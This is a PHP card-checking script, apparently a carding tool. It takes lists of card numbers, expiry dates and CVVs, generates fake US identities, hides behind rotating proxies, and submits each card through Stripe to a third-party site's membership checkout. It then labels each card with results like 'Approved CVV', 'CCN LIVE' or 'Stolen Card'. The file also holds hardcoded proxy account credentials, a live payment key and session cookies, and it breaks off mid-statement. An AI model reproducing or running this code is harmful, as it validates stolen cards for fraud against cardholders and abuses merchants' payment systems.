<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

////////////////////////////===[Proxy]

//////////======= Hydra Proxy
$username = 'lswe42731ralg124169';
$password = 'JRdQhfFq8LYEgJS6_country-UnitedStates';
$port = 9989;
$session = mt_rand();
$super_proxy = 'isp2.hydraproxy.com';

//////////======= Webshare
$webshareuser = 'iqxrudha';
$websharepass = '5pxirv0xzf6p';
$webshareport = 80;
$webshareurl = 'p.webshare.io';

$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
//////////======= Hydra Proxy
//CURLOPT_PROXY => 'http://$super_proxy:$port',
//CURLOPT_PROXYUSERPWD => '$username-session-$session:$password',
//////////======= Webshare
CURLOPT_PROXY => 'http://$webshareurl:$webshareport',
CURLOPT_PROXYUSERPWD => '$webshareuser:$websharepass',
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy Live ✅";
}
if (empty($ip1)){
$ip = "Proxy Dead ❌";
}

////////////////////////////===[1 Req]

$ch = curl_init();
//////////======= Hydra Proxy
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Webshare
curl_setopt($ch, CURLOPT_PROXY, "http://$webshareurl:$webshareport");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
//////////======= Proxy.txt
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8044d577-8e9f-497c-ab7a-01c5b155c874a1572e&muid=0fac2173-cc57-4bd2-9d32-48af11c91c9b34ed35&sid=dc80e772-0c18-40e7-a85a-497af1f753b7e930fa&pasted_fields=number&payment_user_agent=stripe.js%2Ff0920f3ce%3B+stripe-js-v3%2Ff0920f3ce&time_on_page=64129&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1KaSETAMBmIXBNjy');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

$ch = curl_init();
//////////======= Hydra Proxy
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Webshare
curl_setopt($ch, CURLOPT_PROXY, "http://$webshareurl:$webshareport");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
//////////======= Proxy.txt
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://finding-value.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: finding-value.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=d504e92c9360f339dd58a9c1456dd07c; pmpro_visit=1; __stripe_mid=0fac2173-cc57-4bd2-9d32-48af11c91c9b34ed35; __stripe_sid=dc80e772-0c18-40e7-a85a-497af1f753b7e930fa',
'origin: https://finding-value.com',
'referer: https://finding-value.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&other_discount_code=&username=astrov1&password=4096277712646141&password2=4096277712646141&bemail=wilbertmosciski2022%40outlook.com&bconfirmemail=wilbertmosciski2022%40outlook.com&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6141&ExpirationMonth=11&ExpirationYear=2027');

$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));

////////////////////////////===[BIN Info]

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

////////////////////////////===[Responses]===////////////////////////////

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>  Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Invalid CVC ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Approved | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Stolen Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Approved | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Lost Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ 🚀</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Approved | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Pickup Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ 🚀</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Approved | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Stolen Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Approved | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Lost Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ 🚀</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Approved | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Pickup Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank  $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ 🚀</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Expired ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card number is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Declined ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Generic Decline ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Do Not Honor ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Expired Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Doesnt Support This Purchase ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Processing Error ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Service Not Allowed ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>CVC Check Unavailable ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>CVC Check Unavailable ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Declined: Missing Card Details ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Another Request In Process: Card Not Checked ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Transaction Not Allowed ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
